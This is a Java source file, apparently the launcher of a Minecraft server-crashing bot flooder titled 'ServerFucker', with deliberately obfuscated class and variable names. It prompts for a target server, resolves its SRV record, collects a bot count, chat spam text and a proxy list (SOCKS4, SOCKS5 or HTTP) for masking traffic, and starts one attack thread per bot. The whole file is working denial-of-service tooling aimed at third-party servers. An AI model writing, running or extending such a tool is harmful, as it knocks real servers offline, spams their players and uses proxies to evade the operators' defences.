package xyz.zihaoxu;

import com.github.steveice10.packetlib.ProxyInfo;
import org.xbill.DNS.*;
import org.xbill.DNS.Record;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.net.UnknownHostException;
import java.util.Objects;
import java.util.Scanner;
import java.util.stream.Collectors;

public class IIIIlllllI { // Class: ServerCrasher
    private String[] qqqqqq; // args
    public IIIIlllllI(String[] awaaaa/*args*/){
        this.qqqqqq =awaaaa;
    }

    public void aaaawawaw() throws TextParseException, UnknownHostException, FileNotFoundException { // Method: run()
        Scanner aaaaawa=new Scanner(System.in); // scanner
        System.out.println("==============================");
        System.out.println("ServerFucker - By 星空-幻想");
        // System.out.println("为Sysrom祈祷 :)");
        System.out.println("==============================");
        System.out.println("崩服器即将启动,在那之前你需要填写一些信息");
        System.out.print("攻击的目标: ");
        String target = "";
        if (aaaaawa.hasNextLine()){
            target= aaaaawa.nextLine();
        }
        System.out.println("正在解析地址");
        String host;
        int port=25565;
        String[] temp = target.split(":");
        if (temp.length==2){
            host=temp[0];
            port=Integer.parseInt(temp[1]);
        }else {
            Lookup lookup=new Lookup("_minecraft._tcp."+temp[0], Type.SRV);
            lookup.setResolver(new SimpleResolver("8.8.8.8"));
            Record[] records=lookup.run();
            if (records!=null && records.length>0){
                System.out.println("检测到srv记录,将使用srv解析结果");
                host=((SRVRecord)records[0]).getTarget().toString().replaceFirst("\\.$", "");
                port=((SRVRecord)records[0]).getPort();
            }else {
                host=temp[0];
            }
        }
        System.out.println("解析完成:"+host+":"+port);
        llllllllllII.lllIlIll =host;
        llllllllllII.IllIlIl =port;
        System.out.println("你希望机器人的名字以什么开头?");
        System.out.print("留空以随机: ");
        String prefix="";
        if(aaaaawa.hasNextLine()){
            prefix=aaaaawa.nextLine();
        }
        llllllllllII.anString =prefix;
        System.out.print("你期望的机器人的数量: ");
        int count=100;
        if (aaaaawa.hasNextLine()){
            count= Integer.parseInt(aaaaawa.nextLine());
        }
        llllllllllII.an114514 =count;
        System.out.println("是否以最小化运行?(true/false)");
        System.out.println("默认为false: ");
        String mimi="";
        if (aaaaawa.hasNextLine()){
            mimi= aaaaawa.nextLine();
        }
        llllllllllII.aaawwawwa= Objects.equals(mimi, "true");
        if (!llllllllllII.aaawwawwa) {
            String text = "";
            System.out.println("你希望机器人进入服务器之后发送什么内容?");
            System.out.print("留空以不发送: ");
            if (aaaaawa.hasNextLine()) {
                text = aaaaawa.nextLine();
            }
            llllllllllII.ananan = text;
        }
        System.out.println("最后一步,你希望使用代理吗?如果是,输入代理文件的地址(.txt格式)");
        System.out.print("留空以不使用: ");
        String aawaw="";
        if (aaaaawa.hasNextLine()){
            aawaw= aaaaawa.nextLine();
        }
        llllllllllII.aawawa=aawaw;
        if (aawaw!=""){
            File llIlIIl = new File(aawaw);
            BufferedReader reader=new BufferedReader(new FileReader(llIlIIl));
            llllllllllII.aaawww=reader.lines().collect(Collectors.toList());
            System.out.println("代理的类型是?(SOCKS4/SOCKS5/HTTP)");
            System.out.print("留空默认SOCKS4: ");
            String ttttt="";
            if (aaaaawa.hasNextLine()){
                ttttt= aaaaawa.nextLine();
            }
            if (!ttttt.isEmpty()){
                llllllllllII.IIlllIL =ProxyInfo.Type.valueOf(ttttt.toUpperCase());
            }
        }
        System.out.println("准备启动...");
        this.awawa();
    }

    public void awawa(){
        for (int i = 0; i< llllllllllII.an114514; i++){
            new Thread(new IIIIlllIl()).start();
        }
        // new Thread(new IllIll()).start();
    }
}